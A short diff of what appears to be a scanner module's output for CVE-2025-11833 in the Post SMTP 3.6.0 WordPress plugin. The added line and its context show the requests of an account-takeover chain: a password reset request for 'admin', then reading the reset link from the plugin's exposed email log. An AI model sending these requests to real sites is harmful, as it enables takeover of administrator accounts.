@@ -356,6 +356,7 @@ CVE-2025-11833:
 |   smtp detection: post smtp 3.6.0 [vulnerable version]
 |    _login-search: 7 of 36 wp-login.php possible urls tested
 |    _post-request: /wp-login.php?action=lostpassword&page=postman_email_log&view=log&log_id=1&print=1
+|    _post-payload: user_login=admin&redirect_to=&wp-submit=Get+New+Password
 |    _response: PASSWORD RESET LINK FOUND IN RESPONSE [vulnerable]
 |      module author: r00t-3xp10it
 |
